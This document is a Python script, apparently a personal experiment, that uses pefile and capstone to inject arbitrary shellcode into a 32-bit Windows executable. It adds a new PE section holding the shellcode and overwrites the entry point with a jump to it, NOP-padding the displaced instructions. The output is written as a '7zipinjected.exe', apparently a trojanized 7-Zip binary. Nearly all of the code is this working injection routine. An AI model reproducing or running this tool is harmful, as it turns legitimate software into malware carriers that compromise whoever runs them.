#!/usr/bin/env python

import sys
from pathlib import Path
from struct import pack
from pefile import PE
from capstone import CS_ARCH_X86, CS_MODE_32, Cs
from argparse import ArgumentParser, Namespace
from utils import (
    hexstr,
    hexslash,
    byteslash,
    shellcode_encoder,
    byteshex,
    iterbytes,
    intbyte,
)
from inject import Injector
from inject.enums import IX86_JUMP, IX86_PUSHA, IX86_POPA, IX86_NOP


def work(file: Path, sc: bytes):
    pe = PE(str(file))
    eop = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    # A PE file has a preferred base address.
    # PE Analysis analyzes pe only so it assumes the preferred base address, which is 0x40000000 (probably)
    # real base may be different
    base = pe.OPTIONAL_HEADER.ImageBase
    eop_relative = eop + base
    print("Entry Point:", hexstr(eop))
    print("Base:", hexstr(base))
    print("Relative Entry Point:", hexstr(eop_relative))
    print()
    ##  a few ways to do this:

    ## Using get_memory_mapped_image
    # data = pe.get_memory_mapped_image()[eop : eop + 32]
    # cs = Cs(CS_ARCH_X86, CS_MODE_32)
    # for i in cs.disasm(data, eop_relative):
    #     print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))

    ## finding section by eop_relative manually
    # sections = None
    # for s in pe.sections:
    #     if s.contains_rva(eop_relative):
    #         section = s
    # if not section:
    #     print("No Section Found")
    #     return

    ## finding section by rva w/ eop
    section = pe.get_section_by_rva(eop)
    data = section.get_data(eop)
    cs = Cs(CS_ARCH_X86, CS_MODE_32)
    c = 0
    o = []
    for i in cs.disasm(data, eop_relative):
        if c > 8:
            break
        o.append(i)
        # print("ID:", i.id)
        # if addr != i.address:
        #     print("NE", hexstr(addr), hexstr(i.addd))
        # print("Address:", hexstr(i.address))
        # print("Mnemonic:", i.mnemonic)
        # print("Op String:", i.op_str)
        # print("Size:", i.size)
        # # print("Bytes:", i.bytes.hex())
        # print("Bytes:", byteslash(i.bytes))
        # print()

        c = c + 1

    # Well the <address> = [dest. address] - [start address] - 5
    # dest. address = start address of new PE section that we made
    # start address = start address of PE file (entrypoint)
    # -5 = this is the size of jmp instruction in itself to adjust the address

    sc = sc
    injector = Injector(
        sc, file, Path("../../payloads/7zipinjected.exe"), {"log_level": 2}
    )
    injector.setup()
    injector.expand()
    injector.create_new_section()
    injector.write_shellcode()
    injector.manager.save()

    print("-- Changing Jump Instruction --")
    original_start_address = injector.manager.address_of_entry_point()
    original_start_address_rel = original_start_address + injector.manager.image_base()
    last_section_start = injector.manager.last_section().VirtualAddress
    print("[*] Jump From (EP):", hexstr(original_start_address))
    # print("Jump From (EP Rel):", hexstr(original_start_address_rel))
    print("[*] Jump To (New Section):", hexstr(last_section_start))
    # jmp_address = int(last_section_start, 16) - int(original_start_address, 16) - 5
    jump_distance = last_section_start - original_start_address - 5
    print("[*] Jump To Difference:", hexstr(jump_distance))
    # jump_distance = pack("I", jump_distance & 0xFFFFFFFF)
    jump_distance = pack("I", jump_distance)
    print("[*] Jump Distance (Packed):", byteshex(jump_distance))
    jmp_ops = IX86_JUMP + jump_distance
    print(f"[*] Jmp Ops {byteslash(jmp_ops)}")
    print(f"[*] Jmp Size {len(jmp_ops)}")
    print("[*] Overwriting...")

    original_data = injector.manager.pe.get_memory_mapped_image()[
        eop : eop + len(jmp_ops) + 30
    ]
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    offset = 0
    for i_caps in md.disasm(original_data, eop_relative):
        offset += len(i_caps.bytes)
        if offset >= len(jmp_ops):
            break
    original_data = pe.get_memory_mapped_image()[eop : eop + offset]
    if len(jmp_ops) < len(original_data):
        num_of_nops = len(original_data) - len(jmp_ops)
        fill = b"\x90" * num_of_nops
        post_jmp_offset = eop + len(jmp_ops)
        print(f"[*] Packing {num_of_nops} Nops at offset {hexstr(post_jmp_offset)}")
        injector.manager.pe.set_bytes_at_rva(post_jmp_offset, fill)
    else:
        print("[*] No nop pack necessary")

    injector.manager.pe.set_bytes_at_rva(eop, jmp_ops)
    injector.write_shellcode()
    injector.manager.save_changes()

    print("Old Ops")
    for i in o:
        print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))

    print("New Ops")
    section = injector.manager.pe.get_section_by_rva(eop)
    data = section.get_data(eop)
    cs = Cs(CS_ARCH_X86, CS_MODE_32)
    c = 0
    for i in cs.disasm(data, eop_relative):
        if c > 8:
            break
        print("0x%x:\t%s\t%s" % (i.address, i.mnemonic, i.op_str))
        c = c + 1


def apply_parser(parser: ArgumentParser) -> ArgumentParser:
    parser.add_argument(
        "-f", "--file", type=str, help="path to pe file", required=True,
    )
    parser.add_argument(
        "-s", "--shellcode", type=str, help="path to shellcode", required=True,
    )
    return parser


def normalize_args(args: Namespace) -> dict:
    items = vars(args)
    items["shellcode"] = shellcode_encoder(items["shellcode"])

    p_file = Path(items["file"])
    if not p_file.is_file():
        print(f"File not found at {items['file']}")
        sys.exit(1)
    items["file"] = p_file
    return items


if __name__ == "__main__":
    parser = ArgumentParser(
        description="Playground for experimenting with pefile/capstone"
    )
    parser = apply_parser(parser)
    args = normalize_args(parser.parse_args())

    work(Path(args["file"]), args["shellcode"])

    sys.exit(0)
